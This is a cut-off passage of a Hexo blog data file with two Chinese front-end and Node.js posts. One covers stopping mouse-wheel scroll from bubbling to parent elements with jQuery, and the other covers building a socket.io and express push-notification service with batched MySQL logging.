class=\"line\">$.fn.extend( &#123;</span><br><span class=\"line\">  preventScroll: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    $( <span class=\"keyword\">this</span> ).each( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">var</span> _this = <span class=\"keyword\">this</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( navigator.userAgent.indexOf( <span class=\"string\">'Firefox'</span> ) &gt;= <span class=\"number\">0</span> ) &#123; <span class=\"comment\">//firefox  </span></span><br><span class=\"line\">        _this.addEventListener( <span class=\"string\">'DOMMouseScroll'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> e </span>) </span>&#123;</span><br><span class=\"line\">          _this.scrollTop += e.detail &gt; <span class=\"number\">0</span> ? <span class=\"number\">60</span> : <span class=\"number\">-60</span>;</span><br><span class=\"line\">          e.preventDefault();</span><br><span class=\"line\">        &#125;, <span class=\"literal\">false</span> );</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        _this.onmousewheel = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> e </span>) </span>&#123;</span><br><span class=\"line\">          e = e || <span class=\"built_in\">window</span>.event;</span><br><span class=\"line\">          _this.scrollTop += e.wheelDelta &gt; <span class=\"number\">0</span> ? <span class=\"number\">-60</span> : <span class=\"number\">60</span>;</span><br><span class=\"line\">          <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125; )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125; );</span><br><span class=\"line\">$( <span class=\"string\">\".box\"</span> ).preventScroll();</span><br></pre></td></tr></table></figure>\n<p>然后问题就这么愉快的解决了！<br>\n于是我便开始愉快的开始测试，是的当当前滚动条滚动到滚动到顶部继续滚动的话，不会导致body或者其他父元素的滚动条继续滚动，但是总觉得哪里没对。不信的童鞋可以直接写代码测试一下。</p>\n<p>其他浏览器我没有测试过，用chrome的童鞋肯定发现了，惯性呢？滚动的惯性呢？是的因为<code>e.preventDefault()</code>阻止了它的默认滚动行为，改用<code>this.scrollTop += e.detail &gt; 0 ? 60 : -60</code>这种编程式的滚动，导致滚动没那么流畅了。肯定有人会说，再继续写代码模拟这个惯性不就好了吗？ 确实可以，但不觉得代价太大了点？是的，肯定有其他的解决办法。其实爱思考的人看到这里早已找到了答案，通过<code>e.detail</code>或者<code>e.wheelDelta</code>是可以知道鼠标滚轮是在向上还是向下滚动的，<code>向上滚，滚动到顶部，则e.preventDefault()，向下滚，滚动到最下面，也e.preventDefault()</code>，于是这个题目就这样完美的解决了，滚动的行为依然是浏览器的默认行为，但是它确实不再向上冒泡了，贴上代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$.fn.extend( &#123;</span><br><span class=\"line\">  preventScroll: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $( <span class=\"keyword\">this</span> ).each( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">var</span> _this = <span class=\"keyword\">this</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( navigator.userAgent.toLowerCase().indexOf( <span class=\"string\">\"firefox\"</span> ) &gt; <span class=\"number\">0</span> ) &#123;</span><br><span class=\"line\">        _this.addEventListener( <span class=\"string\">'DOMMouseScroll'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> e </span>) </span>&#123;</span><br><span class=\"line\">          <span class=\"comment\">// 滚动到最下面，并且鼠标向上（反正是一直往下拉那个动作）</span></span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( <span class=\"keyword\">this</span>.scrollTop + <span class=\"keyword\">this</span>.clientHeight == <span class=\"keyword\">this</span>.scrollHeight &amp;&amp; e.detail &gt; <span class=\"number\">0</span> ) &#123;</span><br><span class=\"line\">            e.preventDefault();</span><br><span class=\"line\">            e.returnValue = <span class=\"literal\">false</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"comment\">// 滚动到最上面，并且鼠标向下（反正是一直往上拉那个动作）</span></span><br><span class=\"line\">          <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( <span class=\"keyword\">this</span>.scrollTop === <span class=\"number\">0</span> &amp;&amp; e.detail &lt; <span class=\"number\">0</span> ) &#123;</span><br><span class=\"line\">            e.preventDefault();</span><br><span class=\"line\">            e.returnValue = <span class=\"literal\">false</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;, <span class=\"literal\">false</span> );</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        _this.addEventListener( <span class=\"string\">'mousewheel'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> e </span>) </span>&#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( <span class=\"keyword\">this</span>.scrollTop + <span class=\"keyword\">this</span>.clientHeight == <span class=\"keyword\">this</span>.scrollHeight &amp;&amp; e.wheelDelta &lt; <span class=\"number\">0</span> ) &#123;</span><br><span class=\"line\">            e.preventDefault();</span><br><span class=\"line\">            e.returnValue = <span class=\"literal\">false</span>;</span><br><span class=\"line\">          &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( <span class=\"keyword\">this</span>.scrollTop === <span class=\"number\">0</span> &amp;&amp; e.wheelDelta &gt; <span class=\"number\">0</span> ) &#123;</span><br><span class=\"line\">            e.preventDefault();</span><br><span class=\"line\">            e.returnValue = <span class=\"literal\">false</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;, <span class=\"literal\">false</span> );</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>;</span><br><span class=\"line\">    &#125; );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125; );</span><br></pre></td></tr></table></figure>\n<p>是的，这个问题就这么完美解决了，可能不是最佳实现，但是确实比上面的代码要更贴近浏览器原来的样子，我们在写代码的时候对于浏览器的默认行为，不管是从代码来说还是用户体验来说，都应该抱着谨慎的态度。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>我们都知道，浏览器的事件一般是从元素的一层一层网上冒泡的(<code>document.addEventListener</code>方法的第三个参数设置为<code>true</code>则是冒泡, <code>false</code>则是捕获)，鼠标的滚轮事件也不例外，当某个滚动区域的内容滚动到最底部时，则会往上走，找到最近的父元素，继续滚动。在某些时候这是个很不错的设定，但是当页面的可滚动区域过多的时候，便会造成不好的用户体验。给人以“到处都在动”的感觉，可能你马上会想到<code>event.stopPropagation()</code>这个方法，但是你可以先试试有用吗。#滑稽#</p>\n<p>没错，我也是试了之后发现根本没什么卵用，所以就在网上找  代码如下：（摘自<a href=\"http://blog.csdn.net/jyy_12/article/details/6878049\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/jyy_12/article/details/6878049</a>）:</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$.fn.extend( &#123;</span><br><span class=\"line\">  preventScroll: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    $( <span class=\"keyword\">this</span> ).each( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">var</span> _this = <span class=\"keyword\">this</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( navigator.userAgent.indexOf( <span class=\"string\">'Firefox'</span> ) &gt;= <span class=\"number\">0</span> ) &#123; <span class=\"comment\">//firefox  </span></span><br><span class=\"line\">        _this.addEventListener( <span class=\"string\">'DOMMouseScroll'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> e </span>) </span>&#123;</span><br><span class=\"line\">          _this.scrollTop += e.detail &gt; <span class=\"number\">0</span> ? <span class=\"number\">60</span> : <span class=\"number\">-60</span>;</span><br><span class=\"line\">          e.preventDefault();</span><br><span class=\"line\">        &#125;, <span class=\"literal\">false</span> );</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        _this.onmousewheel = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> e </span>) </span>&#123;</span><br><span class=\"line\">          e = e || <span class=\"built_in\">window</span>.event;</span><br><span class=\"line\">          _this.scrollTop += e.wheelDelta &gt; <span class=\"number\">0</span> ? <span class=\"number\">-60</span> : <span class=\"number\">60</span>;</span><br><span class=\"line\">          <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125; )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125; );</span><br><span class=\"line\">$( <span class=\"string\">\".box\"</span> ).preventScroll();</span><br></pre></td></tr></table></figure>\n<p>然后问题就这么愉快的解决了！<br>\n于是我便开始愉快的开始测试，是的当当前滚动条滚动到滚动到顶部继续滚动的话，不会导致body或者其他父元素的滚动条继续滚动，但是总觉得哪里没对。不信的童鞋可以直接写代码测试一下。</p>\n<p>其他浏览器我没有测试过，用chrome的童鞋肯定发现了，惯性呢？滚动的惯性呢？是的因为<code>e.preventDefault()</code>阻止了它的默认滚动行为，改用<code>this.scrollTop += e.detail &gt; 0 ? 60 : -60</code>这种编程式的滚动，导致滚动没那么流畅了。肯定有人会说，再继续写代码模拟这个惯性不就好了吗？ 确实可以，但不觉得代价太大了点？是的，肯定有其他的解决办法。其实爱思考的人看到这里早已找到了答案，通过<code>e.detail</code>或者<code>e.wheelDelta</code>是可以知道鼠标滚轮是在向上还是向下滚动的，<code>向上滚，滚动到顶部，则e.preventDefault()，向下滚，滚动到最下面，也e.preventDefault()</code>，于是这个题目就这样完美的解决了，滚动的行为依然是浏览器的默认行为，但是它确实不再向上冒泡了，贴上代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$.fn.extend( &#123;</span><br><span class=\"line\">  preventScroll: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $( <span class=\"keyword\">this</span> ).each( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">var</span> _this = <span class=\"keyword\">this</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( navigator.userAgent.toLowerCase().indexOf( <span class=\"string\">\"firefox\"</span> ) &gt; <span class=\"number\">0</span> ) &#123;</span><br><span class=\"line\">        _this.addEventListener( <span class=\"string\">'DOMMouseScroll'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> e </span>) </span>&#123;</span><br><span class=\"line\">          <span class=\"comment\">// 滚动到最下面，并且鼠标向上（反正是一直往下拉那个动作）</span></span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( <span class=\"keyword\">this</span>.scrollTop + <span class=\"keyword\">this</span>.clientHeight == <span class=\"keyword\">this</span>.scrollHeight &amp;&amp; e.detail &gt; <span class=\"number\">0</span> ) &#123;</span><br><span class=\"line\">            e.preventDefault();</span><br><span class=\"line\">            e.returnValue = <span class=\"literal\">false</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"comment\">// 滚动到最上面，并且鼠标向下（反正是一直往上拉那个动作）</span></span><br><span class=\"line\">          <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( <span class=\"keyword\">this</span>.scrollTop === <span class=\"number\">0</span> &amp;&amp; e.detail &lt; <span class=\"number\">0</span> ) &#123;</span><br><span class=\"line\">            e.preventDefault();</span><br><span class=\"line\">            e.returnValue = <span class=\"literal\">false</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;, <span class=\"literal\">false</span> );</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        _this.addEventListener( <span class=\"string\">'mousewheel'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> e </span>) </span>&#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( <span class=\"keyword\">this</span>.scrollTop + <span class=\"keyword\">this</span>.clientHeight == <span class=\"keyword\">this</span>.scrollHeight &amp;&amp; e.wheelDelta &lt; <span class=\"number\">0</span> ) &#123;</span><br><span class=\"line\">            e.preventDefault();</span><br><span class=\"line\">            e.returnValue = <span class=\"literal\">false</span>;</span><br><span class=\"line\">          &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( <span class=\"keyword\">this</span>.scrollTop === <span class=\"number\">0</span> &amp;&amp; e.wheelDelta &gt; <span class=\"number\">0</span> ) &#123;</span><br><span class=\"line\">            e.preventDefault();</span><br><span class=\"line\">            e.returnValue = <span class=\"literal\">false</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;, <span class=\"literal\">false</span> );</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>;</span><br><span class=\"line\">    &#125; );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125; );</span><br></pre></td></tr></table></figure>\n<p>是的，这个问题就这么完美解决了，可能不是最佳实现，但是确实比上面的代码要更贴近浏览器原来的样子，我们在写代码的时候对于浏览器的默认行为，不管是从代码来说还是用户体验来说，都应该抱着谨慎的态度。</p>\n"},{"title":"搭建属于自己的web推送服务","catalog":true,"date":"2017-12-10T13:31:32.000Z","subtitle":null,"header-img":"post/15.jpg","_content":"上一次说`websocket`还是在“[解决Websocket并发执行的问题](/2017/09/12/page-parallel-execute)”这篇文章，不过提到的内容是在不同标签页的消息同时到来时的处理方式，不过治标不治本，还是有几率出现重复推送的问题，而且这样的代码也不是很严谨，所以这个问题只能从服务端着手了。其实在很早之前就看过`goeasy`这个第三方推送服务的`client`源码，当时就吐槽它们代码之烂，二次封装的代码居然直接修改了`socket.io`（goeasy是基于nodejs的开源库[socket.io](http://socket.io)来做的）的源码，然后添加了自己的代码，再将`goeasy`构造函数强行暴露给window，据说是为了适配不同了浏览器要求一定要动态引用他们的js代码，我猜应该是做了cdn处理吧，可恶的是还拒绝缓存，所以有时候会造成我们网站一直等待goeasy的js代码。扯远了，还是说说我们自己如何去构建一个基于channel的推送服务吧。\n\n`socoket.io`这个库把自己封装得更像是一个聊天室，甚至里面的有属性也命名为`room`（若理解错误还请轻喷）。我们的网页应用更侧重于按用户id接收来自服务器的消息推送，因为可能存在多个标签页，所以就可能反复的订阅消息，这也是导致上面我的提到的重复推送的问题，因为我们是基于h5的`Notification`来做的，网页一旦都接收消息，就会出现几个标签页，收到几次桌面通知的问题。所以，我也是直接吸收了goeasy的设计思路，直接按channel来订阅和发送消息。文档都是摆在那儿的，网上零零碎碎的教程也不系统化，还是只能看官方文档，英语不到位也只能看会儿机翻的结果再适当切回去。\n\n我采用的是`socket.io + express 4`的模式，其实要将二者结合起来还是非常简单的\n```js\nvar app = require( 'express' )();\nvar server = require( 'http' ).createServer( app );\nvar io = require( 'socket.io' )( server );\nserver.listen( 3000 );\n```\n主要还是在`io`这里，我们需要处理来自客户端的连接事件\n```js\nio.on( 'connection', function( socket ) {\n  socket\n    .on( 'login', function( { channel, socketDeviceID } ) {\n      // 这里至关重要，我们用这个标记这个连接是否来自同一个浏览器\n      socket.socketDeviceID = socketDeviceID\n      // 将这个连接合并到channel这个频道，也就是用户id\n      socket.join( channel )\n    } )\n    .on( 'message', function( content ) {\n      messageSend( io, content )\n    } )\n} )\n```\n其实这里很简单，就是监听客户端连接，然后再监听当前连接的login事件，再自动合并相同用户的连接。\n为了方便理解再贴上客户端代码\n```js\nimport io from 'socket.io-client'\nlet socket = io( 'localhost:3000' )\n\nsoket.emit( 'login', {\n  channel: 'user1',\n  socketDeviceID: 'xxxxxxx' // 这里是一个随机字符串，反正能尽量保证当前浏览器的唯一性就好了\n} )\n```\n客户端也很简单吧。\n其实麻烦的是我们要处理消息的发送就是上面的`messageSend`函数要做的事，`content`的结构因该是\n```json\n{\n  \"channel\": \"\",\n  \"content\": \"\",\n  \"ak\": \"\"\n}\n```\n用户id，发送内容和`application key`，ak是为了防止别人恶意调用。\n上面的`message`事件只是为了后面的客户端提交，我们的程序服务端要发送事件应该提供更友好的发送方式，所以我们就需要一个url来提供api形式的推送`express`的路由就不赘述了，因为不是本篇文章的讲述内容。下面是`/publish`接口的处理函数\n```js\nmessageSend( io, { channel, content, ak } ) {\n\n  if ( ak !== 'ak' ) return Promise.resolve( 10001 )\n  if ( !channel || !content ) return Promise.resolve( 10002 )\n  let { event } = typeof content !== 'object' ? JSON.parse( content ) : content\n\n  return new Promise( ( resolve, reject ) => {\n    io.to( channel ).clients( function( err, clients ) {\n      err && reject( err )\n      let { connected } = io.of( '/' )\n      let promiseArray = []\n      // 我们在这里单独处理message类型的事件\n      // ps: 推往客户端的内容有一个规范，event字段为必须项，用来描述内容的类型，messge|refresh等\n      if ( event === 'message' ) {\n        let names = {}\n        // 在这里将来自同一个浏览器的连接进行合并，取最后连接上的那个连接\n        clients.forEach( item => names[ connected[ item ].socketDeviceID ] = item )\n        // 填充消息进行发送\n        promiseArray = Object.keys( names ).map( key => messageEmit( connected[ names[ key ] ], channel, content ) )\n      } else {\n        promiseArray = clients.map( clientId => messageEmit( connected[ clientId ], channel, content ) )\n      }\n      // 将消息一并发送出去 \n      // TODO，应将0以外的消息进行筛选\n      Promise.all( promiseArray ).then( () => resolve( 0 ) )\n    } )\n  } )\n}\n```\n这是对消息的发送对象进行处理，下面是发送逻辑\n```js\n/**\n * 发送消息，延迟N秒后告知发送失败\n * @param {*} socket \n * @param {*} content \n */\nfunction messageEmit( socket, channel, content ) {\n  let { event } = typeof content !== 'object' ? JSON.parse( content ) : content\n  function pushDBData( status ) {\n    let platform = channel.substr( channel.lastIndexOf( '_' ) + 1 )\n    // 将消息发送结果存入等待持久化的队列\n    pushArrayAdd( {\n      channel,\n      status,\n      send_content: JSON.stringify( content ),\n      push_date: Date.now(),\n      event_type: event,\n      platform\n    } )\n  }\n\n  return new Promise( ( resolve ) => {\n    let retry = retryTimes\n    let timeID = setTimeout( function sendTimeout() {\n      if ( !retry ) {\n        resolve( 10000 )\n        pushDBData( 0 )\n      } else {\n        retry--\n        sendTimeout()\n        console.log( `${new Date}用户“${channel}”消息发送超时` )\n      }\n    }, sendTimeout )\n    socket.emit( 'message', content, function() {\n      resolve( 0 )\n      clearTimeout( timeID )\n      pushDBData( 1 )\n    } )\n  } ).catch( err => { throw new Error( err ) } )\n}\n```\n对消息发送，超出时间未收到客户端的响应递归尝试N次，一直失败则判定为失败。这里的10000和0都是对接口请求者的响应码。\n接下来是对发送记录的入库\n```js\nexports.pushArrayAdd = function( pushItem ) {\n  pushArray.push( pushItem )\n  if ( pushArray.length >= 100 ) {\n    console.log(`插入数据库${new Date}`)\n    // 每一百条数据清空一次\n    staistical.insertPushRecord( _.cloneDeep( pushArray ) )\n    pushArray = []\n  }\n}\n```\n`pushArray`肯定是一个单例模式的数据，也就是我们的`dataStore`，我们肯定不能发一条就存一条，这也不专业，定时储存或达到一个量再储存是比较为数据库着想的。如果消息推送得少我们可以再启动一个定时器定时去清空一次这个队列，防止数据过久存放在内存里导致更新不及时，或服务重启导致的数据丢失。\n接下来就是数据库的写入操作了，nodejs发展到今天生态已经很好了，对mysql进行操作的包与其同名，不过操作起来感觉还是过于简陋，对于`connection`都是手动拿手动释放。不过连接池这一块貌似很方便。期间用到了非常非常多的回调，mysql这个包也没有提供Promise返回（我猜的，官方推荐是回调的形式），还好我用的nodejs版本比较高，我便优雅的全部封装成Promise返回了，方便我调用，于是像`query、insert`这样的函数我就直接声明成`asycn`函数了\n```js\nconst mysql = require( 'mysql' )\nconst { mysql: mysqlConfig } = require( '../config' )\nconst pool = mysql.createPool( mysqlConfig )\n/**\n * 获取连接池中的连接\n */\nmodule.exports = class DBBase {\n\n  /**\n   * 获取数据库连接\n   */\n  getConnection() {\n    return new Promise( ( resolve, reject ) => {\n      pool.getConnection( ( err, connection ) => ( err ? reject( err ) : resolve( connection ) ) )\n    } ).catch( err => {\n      console.log( err )\n    } )\n  }\n\n  /**\n   * 查询记录\n   * \n   * @param {*} sql \n   * @param {*} condition \n   */\n  async query( sql, condition ) {\n    let con = await this.getConnection()\n    return new Promise( ( resolve, reject ) => {\n      con.query( sql, condition, ( err, result ) => {\n        err ? reject( err ) : resolve( result )\n        con.release()\n      } )\n    } )\n  }\n\n  /**\n   * 插入记录\n   * \n   * @param {*} sql \n   * @param {*} dataArray \n   */\n  insert( sql, dataArray ) {\n    return this.query( sql, [ dataArray ] )\n  }\n}\n\n```\n这是所有需要有数据库操作的对象的基类，这样一来我所有的操作就不用再去手动取连接，用完再释放了，下面是继承它的子类的一些简单操作\n```js\nclass StatisticalDao extends DBBase {\n  constructor() {\n    super()\n  }\n\n  async insertPushRecord( arr ) {\n    \n    let insertData = arr.map( item => ( [\n      item.push_date,\n      item.send_content,\n      item.status,\n      item.channel,\n      item.event_type,\n      item.platform\n    ] ) )\n\n    return await this.insert( `insert into bigwe_notification_records( \n      push_date, \n      send_content, \n      status,\n      channel,\n      event_type,\n      platform\n    ) values ?`,\n      insertData )\n  }\n}\n\nmodule.exports = new StatisticalDao()\n```\n哈，Dao的结尾命名纯属情怀，想起了写java的时光。这里的`insertPushRecord`方法就是上面对队列里的数据操作时调用的方法，批量插入数据。\n其实在接收来此接口请求者post过来的数据的时候还有点小插曲，先是get取得到post取不到于是加了这句\n```js\nconst bodyParser = require( 'body-parser' )\n\napp.use( bodyParser.json() )\napp.use( bodyParser.urlencoded( { extended: true } ) )\n```\nhtml端post取到了，后面模拟真实后端post，又取不到了，原来是格式原因，`jquery`默认了我们的json格式于是以application/json的格式post，而后端的post是以`form`的格式post，于是又引入了\n```js\nconst connectMultiparty = require( 'connect-multiparty' )\napp.post( '/publish', connectMultiparty(), routerHandler.publish( io ) )\n```\n这样来处理form数据，真是坎坷啊。\n\n以上则是服务端的大致情况，当然，这仅仅是能完成推送服务，还有在线人数统计等需要慢慢完善的功能。\n客户端的代码则相当简单了，提供一个订阅函数就好了，并且在代码里记得`ws`断线重连后重新login，不然就接收不到消息了。\n完整的代码整理后会放到github，敬请期待~ 😄","source":"_posts/node-websocket-server.md","raw":"---\ntitle: 搭建属于自己的web推送服务\ncatalog: true\ndate: 2017-12-10 21:31:32\nsubtitle: \nheader-img: post/15.jpg\ntags:\n- websocket\n- nodejs\n---\n上一次说`websocket`还是在“[解决Websocket并发执行的问题](/2017/09/12/page-parallel-execute)”这篇文章，不过提到的内容是在不同标签页的消息同时到来时的处理方式，不过治标不治本，还是有几率出现重复推送的问题，而且这样的代码也不是很严谨，所以这个问题只能从服务端着手了。其实在很早之前就看过`goeasy`这个第三方推送服务的`client`源码，当时就吐槽它们代码之烂，二次封装的代码居然直接修改了`socket.io`（goeasy是基于nodejs的开源库[socket.io](http://socket.io)来做的）的源码，然后添加了自己的代码，再将`goeasy`构造函数强行暴露给window，据说是为了适配不同了浏览器要求一定要动态引用他们的js代码，我猜应该是做了cdn处理吧，可恶的是还拒绝缓存，所以有时候会造成我们网站一直等待goeasy的js代码。扯远了，还是说说我们自己如何去构建一个基于channel的推送服务吧。\n\n`socoket.io`这个库把自己封装得更像是一个聊天室，甚至里面的有属性也命名为`room`（若理解错误还请轻喷）。我们的网页应用更侧重于按用户id接收来自服务器的消息推送，因为可能存在多个标签页，所以就可能反复的订阅消息，这也是导致上面我的提到的重复推送的问题，因为我们是基于h5的`Notification`来做的，网页一旦都接收消息，就会出现几个标签页，收到几次桌面通知的问题。所以，我也是直接吸收了goeasy的设计思路，直接按channel来订阅和发送消息。文档都是摆在那儿的，网上零零碎碎的教程也不系统化，还是只能看官方文档，英语不到位也只能看会儿机翻的结果再适当切回去。\n\n我采用的是`socket.io + express 4`的模式，其实要将二者结合起来还是非常简单的\n```js\nvar app = require( 'express' )();\nvar server = require( 'http' ).createServer( app );\nvar io = require( 'socket.io' )( server );\nserver.listen( 3000 );\n```\n主要还是在`io`这里，我们需要处理来自客户端的连接事件\n```js\nio.on( 'connection', function( socket ) {\n  socket\n    .on( 'login', function( { channel, socketDeviceID } ) {\n      // 这里至关重要，我们用这个标记这个连接是否来自同一个浏览器\n      socket.socketDeviceID = socketDeviceID\n      // 将这个连接合并到channel这个频道，也就是用户id\n      socket.join( channel )\n    } )\n    .on( 'message', function( content ) {\n      messageSend( io, content )\n    } )\n} )\n```\n其实这里很简单，就是监听客户端连接，然后再监听当前连接的login事件，再自动合并相同用户的连接。\n为了方便理解再贴上客户端代码\n```js\nimport io from 'socket.io-client'\nlet socket = io( 'localhost:3000' )\n\nsoket.emit( 'login', {\n  channel: 'user1',\n  socketDeviceID: 'xxxxxxx' // 这里是一个随机字符串，反正能尽量保证当前浏览器的唯一性就好了\n} )\n```\n客户端也很简单吧。\n其实麻烦的是我们要处理消息的发送就是上面的`messageSend`函数要做的事，`content`的结构因该是\n```json\n{\n  \"channel\": \"\",\n  \"content\": \"\",\n  \"ak\": \"\"\n}\n```\n用户id，发送内容和`application key`，ak是为了防止别人恶意调用。\n上面的`message`事件只是为了后面的客户端提交，我们的程序服务端要发送事件应该提供更友好的发送方式，所以我们就需要一个url来提供api形式的推送`express`的路由就不赘述了，因为不是本篇文章的讲述内容。下面是`/publish`接口的处理函数\n```js\nmessageSend( io, { channel, content, ak } ) {\n\n  if ( ak !== 'ak' ) return Promise.resolve( 10001 )\n  if ( !channel || !content ) return Promise.resolve( 10002 )\n  let { event } = typeof content !== 'object' ? JSON.parse( content ) : content\n\n  return new Promise( ( resolve, reject ) => {\n    io.to( channel ).clients( function( err, clients ) {\n      err && reject( err )\n      let { connected } = io.of( '/' )\n      let promiseArray = []\n      // 我们在这里单独处理message类型的事件\n      // ps: 推往客户端的内容有一个规范，event字段为必须项，用来描述内容的类型，messge|refresh等\n      if ( event === 'message' ) {\n        let names = {}\n        // 在这里将来自同一个浏览器的连接进行合并，取最后连接上的那个连接\n        clients.forEach( item => names[ connected[ item ].socketDeviceID ] = item )\n        // 填充消息进行发送\n        promiseArray = Object.keys( names ).map( key => messageEmit( connected[ names[ key ] ], channel, content ) )\n      } else {\n        promiseArray = clients.map( clientId => messageEmit( connected[ clientId ], channel, content ) )\n      }\n      // 将消息一并发送出去 \n      // TODO，应将0以外的消息进行筛选\n      Promise.all( promiseArray ).then( () => resolve( 0 ) )\n    } )\n  } )\n}\n```\n这是对消息的发送对象进行处理，下面是发送逻辑\n```js\n/**\n * 发送消息，延迟N秒后告知发送失败\n * @param {*} socket \n * @param {*} content \n */\nfunction messageEmit( socket, channel, content ) {\n  let { event } = typeof content !== 'object' ? JSON.parse( content ) : content\n  function pushDBData( status ) {\n    let platform = channel.substr( 